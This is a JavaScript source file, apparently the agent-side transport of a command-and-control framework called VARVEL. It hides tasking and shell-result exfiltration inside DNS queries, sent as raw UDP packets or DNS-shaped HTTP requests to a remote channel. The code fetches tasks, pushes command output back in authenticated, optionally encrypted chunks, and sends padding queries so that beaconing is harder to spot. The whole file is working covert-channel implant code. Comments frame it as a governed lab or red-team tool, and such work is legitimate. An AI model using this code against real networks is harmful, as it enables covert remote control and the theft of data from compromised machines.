// VARVEL — agent-side DNS transport client for the governed callback channel.
//
// Speaks the channel's DNS-codec protocol end-to-end, over EITHER carrier:
//   http://host:port     → the /d route (DNS-shaped query as an HTTP path)
//   dns-udp://host:port  → REAL DNS wire packets (RFC 1035) over UDP
// Same governance contract as the HTTP client: strictly-increasing seq, per-message HMAC,
// chunked push with per-chunk authentication. DNS-shaped transport is LOW-BANDWIDTH by
// nature (small chunks) — big outputs belong on HTTP artifact staging when available; the
// agent keeps shell results compact over this transport by design.

import dgram from 'node:dgram';
import crypto from 'node:crypto';
import { encodeQuery, b32decode } from '../engine/dnscodec.mjs';
import { decodeTxtAnswer } from '../engine/dnswire.mjs';
import { deriveEncKey, sealBytes, isSealedString, openString } from '../engine/envelope.mjs';

const hmac = (key, msg) => crypto.createHmac('sha256', String(key)).update(String(msg)).digest('hex');
const PUSH_CHUNK = 96; // raw bytes per push query — keeps every query inside the codec cap

export class DnsTransport {
  constructor({ url, agentId, token, domain = 'ax.sim', timeout = 8000, enc = false } = {}) {
    if (!url) throw new TypeError('DnsTransport: url required (http://… or dns-udp://…)');
    this.agentId = String(agentId || '');
    this.token = String(token || '');
    this.domain = domain;
    this.timeout = timeout;
    this.seq = 0;
    // Envelope encryption (engine/envelope): enc:true = AEAD-seal push CONTENT and
    // REQUIRE sealed task replies (a plaintext reply is a downgrade — refused loudly
    // via lastError, never silently parsed). The channel mode-gates its side.
    this.enc = enc === true;
    this._encKey = null;
    this.lastError = null;
    const u = new URL(url);
    this.udp = u.protocol === 'dns-udp:';
    this.host = u.hostname;
    this.port = Number(u.port) || (this.udp ? 53 : 80);
    this.httpBase = this.udp ? null : url.replace(/\/$/, '');
    this._sock = null;
  }

  _nextSeq() { return ++this.seq; }

  _key() { if (!this._encKey) this._encKey = deriveEncKey(this.token, this.agentId); return this._encKey; }

  // Decode a pull reply string: sealed ('enc1:…') → AEAD-open → b32 → JSON; plaintext
  // is accepted ONLY when this transport is not enc (an enc agent's plaintext reply is
  // a refused downgrade — loud via lastError, consumed, never tasked from).
  _decodeTaskReply(reply) {
    if (!this.enc) {
      const buf = b32decode(reply);
      if (!buf) return null;
      try { return JSON.parse(buf.toString('utf8')); } catch { return null; }
    }
    if (!isSealedString(reply)) { this.lastError = 'enc-plaintext-reply'; return null; }
    let plain;
    try { plain = openString(this._key(), reply); } catch (e) { this.lastError = 'enc-open-failed:' + ((e && e.code) || 'open'); return null; }
    this.lastError = null;
    const buf = b32decode(plain);
    if (!buf) return null;
    try { return JSON.parse(buf.toString('utf8')); } catch { return null; }
  }

  async _roundTrip(payloadObj) {
    const qname = encodeQuery(payloadObj, { domain: this.domain });
    if (this.udp) {
      // SOURCE BINDING (2026-09-16, measured): a WILDCARD-source UDP socket cannot send to a
      // loopback destination on some Windows hosts (VPN/WFP filter layers return
      // EADDRNOTAVAIL — unbound and 0.0.0.0/:: bound BOTH fail, a specific-loopback source
      // succeeds; see .tmp/udp-source-bind-probe.mjs). A real agent against a real remote
      // resolver was never affected, but a loopback /d-udp test or lab wire was: it failed
      // every round trip. Binding the source to the destination loopback is the honest fix —
      // same socket, same destination, still ≤1 request, and it changes nothing for remote hosts.
      if (!this._sock) {
        this._sock = dgram.createSocket('udp4');
        if (this.host === '127.0.0.1' || this.host === '::1') {
          await new Promise((resolve) => this._sock.bind(0, this.host, () => resolve()));
        }
      }
      const id = (Math.random() * 0xffff) | 0;
      const packet = craftQueryPacket(id, qname);
      const replyBuf = await new Promise((resolve, reject) => {
        const t = setTimeout(() => { cleanup(); resolve(null); }, this.timeout);
        const onMsg = (msg) => { cleanup(); resolve(msg); };
        const onErr = (e) => { cleanup(); reject(e); };
        const cleanup = () => { clearTimeout(t); this._sock.off('message', onMsg); this._sock.off('error', onErr); };
        this._sock.on('message', onMsg);
        this._sock.on('error', onErr);
        this._sock.send(packet, this.port, this.host, () => {});
      });
      if (!replyBuf) return '';
      return decodeTxtAnswer(replyBuf) ?? '';
    }
    const res = await fetch(`${this.httpBase}/d/${qname}`, { signal: AbortSignal.timeout(this.timeout) });
    return await res.text();
  }

  // Check in; returns the task object { taskId, kind, data } or null (idle/denied — uniform).
  async pull() {
    const s = this._nextSeq();
    const h = hmac(this.token, `${this.agentId}:${s}:pull`);
    const reply = await this._roundTrip(this.enc ? { a: this.agentId, s, h, ec: 1 } : { a: this.agentId, s, h });
    if (!reply) return null;
    return this._decodeTaskReply(reply);
  }

  // Padding dummy (constant-rate shaping): same envelope shape as a pull, 'pad' HMAC
  // context. The channel audits it as padding and answers the uniform empty reply.
  async pad() {
    const s = this._nextSeq();
    const h = hmac(this.token, `${this.agentId}:${s}:pad`);
    await this._roundTrip(this.enc ? { a: this.agentId, s, h, ec: 1 } : { a: this.agentId, s, h });
    return true;
  }

  // Push a result body (Buffer/string), chunked + per-chunk HMAC. Returns true when the
  // channel accepted the final chunk. enc: each chunk is AEAD-SEALED first — the HMAC
  // then authenticates the ciphertext (encrypt-then-MAC, the formula is unchanged).
  async push(taskId, body) {
    const buf = Buffer.isBuffer(body) ? body : Buffer.from(String(body ?? ''));
    const chunks = [];
    for (let i = 0; i < buf.length; i += PUSH_CHUNK) chunks.push(buf.subarray(i, Math.min(i + PUSH_CHUNK, buf.length)));
    if (!chunks.length) chunks.push(Buffer.alloc(0));
    const n = chunks.length;
    for (let i = 0; i < n; i++) {
      const s = this._nextSeq();
      const d = (this.enc ? sealBytes(this._key(), chunks[i]) : chunks[i]).toString('base64');
      const h = hmac(this.token, [this.agentId, s, taskId, i, n, d].join(':'));
      await this._roundTrip({ a: this.agentId, s, h, t: taskId, k: 'push', i, n, d });
    }
    return true;
  }

  close() { try { if (this._sock) this._sock.close(); } catch {} this._sock = null; }
}

// Minimal DNS query packet (client side of dnswire).
function craftQueryPacket(id, qname) {
  const parts = String(qname).split('.').filter(Boolean);
  const labels = [];
  for (const p of parts) { const b = Buffer.from(p, 'latin1'); labels.push(Buffer.from([b.length]), b); }
  labels.push(Buffer.from([0]));
  const head = Buffer.alloc(12);
  head.writeUInt16BE(id & 0xffff, 0);
  head.writeUInt16BE(0x0100, 2);   // RD
  head.writeUInt16BE(1, 4);        // QDCOUNT
  const tail = Buffer.alloc(4);
  tail.writeUInt16BE(16, 0);       // TXT
  tail.writeUInt16BE(1, 2);        // IN
  return Buffer.concat([head, ...labels, tail]);
}
